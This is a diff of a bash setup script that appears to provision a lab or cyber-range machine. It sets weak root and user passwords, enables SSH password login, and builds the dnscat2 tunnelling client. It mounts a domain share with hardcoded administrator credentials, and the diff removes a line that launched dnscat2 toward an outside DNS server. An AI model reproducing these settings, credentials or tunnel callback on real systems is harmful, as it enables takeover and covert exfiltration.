@@ -1,10 +1,9 @@
+
 #!/bin/bash
 ##-- setup users
 echo "root:toor" | chpasswd
 useradd Adam_Garrett -U -m -s /bin/bash
 useradd Vanessa_Cohen -U -m -s /bin/bash
-echo "Adam_Garrett:CphTH" | chpasswd
-echo "Vanessa_Cohen:Y71N1" | chpasswd
 ## --allow ssh login with password based authentication
 sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 service ssh restart
@@ -51,11 +50,11 @@ cd dnscat2/client/
 make
 ##mount share from DC
 mkdir /mnt/win_share
-username="Adam.Garrett"
-adamPass="CphTH"
-mount -t cifs -o username=$username, password=$adamPass, domain="gmips" //10.221.0.10/share /mnt/win_share
+username="administrator"
+Pass="P@ssword123"
+mount -t cifs -o username=$username, password=$Pass, domain="gmips" //10.221.0.10/share /mnt/win_share
+echo "Adam_Garrett:CphTH" | chpasswd
+echo "Vanessa_Cohen:Y71N1" | chpasswd
 # --signals completion
 $signal_ms3_complete
-exit 1003
-## -- start dsncat2 client
-/dnscat2/client/dnscat --dns server=207.192.153.100 &
+exit 1001
